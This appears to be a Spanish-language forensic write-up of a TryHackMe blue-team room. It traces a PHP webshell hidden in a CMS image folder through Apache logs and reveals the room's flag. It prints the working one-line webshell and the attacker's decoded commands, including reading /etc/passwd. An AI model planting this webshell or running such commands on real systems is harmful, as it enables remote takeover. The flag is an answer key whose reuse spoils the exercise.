Informe Técnico — Infinity Shell (TryHackMe)
Información General
Máquina: Infinity Shell
Categoría: Blue Team / Forensics
Objetivo: Investigar una intrusión mediante webshell implantada
IP Objetivo: 10.128.136.235
Metodología: Investigación forense y análisis de logs
1. Escenario

Se identificó un posible compromiso en una aplicación web CMS tras la implantación de una webshell PHP utilizada por un atacante remoto.

El objetivo consistía en:

localizar la webshell,
analizar la actividad del atacante,
identificar IOC,
reconstruir los comandos ejecutados,
y recuperar la flag.
2. Enumeración Inicial

Se inspeccionó el directorio web principal:

ls -la /var/www/html
Resultado
CMSsite-master

Posteriormente se accedió al directorio de la aplicación:

cd /var/www/html/CMSsite-master
ls -la
3. Identificación de Archivos PHP

Se realizó una búsqueda de archivos PHP dentro de la aplicación:

find . -name "*.php"
Archivo sospechoso identificado
./img/images.php

La presencia de un archivo PHP dentro de un directorio de imágenes resultó anómala y sospechosa.

4. Análisis de la Webshell

Se inspeccionó el contenido del archivo:

cat ./img/images.php
Contenido
<?php system(base64_decode($_GET['query'])); ?>
5. Análisis Técnico

La webshell permitía:

recibir comandos mediante el parámetro GET query,
decodificar el contenido en Base64,
ejecutar comandos del sistema mediante system().
Funcionamiento

Ejemplo:

/images.php?query=BASE64_DEL_COMANDO

Esto otorgaba ejecución remota de comandos (RCE).

6. Investigación de Logs Apache

Se buscaron referencias al archivo malicioso:

grep -R "images.php" /var/log/apache2 2>/dev/null
7. IOC Identificados
Dirección IP atacante
10.11.93.143
Webshell utilizada
/var/www/html/CMSsite-master/img/images.php
8. Actividad del Atacante

Se identificaron múltiples comandos ejecutados a través de la webshell.

Requests detectadas
Comando Base64	Acción
d2hvYW1pCg==	whoami
bHMK	ls
aWZjb25maWcK	ifconfig
Y2F0IC9ldGMvcGFzc3dkCg==	cat /etc/passwd
aWQK	id
9. Recuperación de la Flag

Se identificó una petición sospechosa:

query=ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=

Se decodificó el contenido Base64:

echo 'ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=' | base64 -d
Resultado
echo 'THM{sup3r_34sy_w3bsh3ll}'
10. Flag
THM{sup3r_34sy_w3bsh3ll}
11. Vulnerabilidades Identificadas
Vulnerabilidad	Impacto
Remote Command Execution (RCE)	Ejecución remota de comandos
Webshell implantada	Persistencia y control remoto
Falta de validación de archivos	Ejecución de PHP malicioso
Exposición de logs	Reconstrucción completa del ataque
12. Recomendaciones
Restringir ejecución de PHP en directorios de imágenes
Implementar WAF
Validar uploads y extensiones
Monitorizar logs Apache
Detectar uso de system() y funciones peligrosas
Aplicar hardening PHP
Utilizar IDS/EDR para detección temprana
Conclusión

La investigación permitió:

identificar una webshell PHP,
rastrear la actividad del atacante,
reconstruir comandos ejecutados,
identificar IOC relevantes,
y recuperar exitosamente la flag mediante análisis forense de logs Apache.
